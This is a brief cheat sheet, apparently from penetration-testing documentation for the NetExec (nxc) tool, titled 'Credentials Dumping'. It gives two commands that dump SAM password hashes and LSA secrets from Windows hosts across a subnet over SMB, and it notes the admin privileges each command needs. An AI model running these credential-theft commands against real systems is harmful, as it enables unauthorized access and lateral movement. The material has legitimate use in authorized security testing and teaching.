# Credentials Dumping

### The following examples use a username and plaintext password although user/hash combos work as well.

# Dump SAM

## Dump SAM hashes using methods from secretsdump.py

## You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

#### #~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

# Dump LSA

## Dump LSA secrets using methods from secretsdump.py

## Requires Domain Admin or Local Admin Priviledges on target Domain Controller!

#### #~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

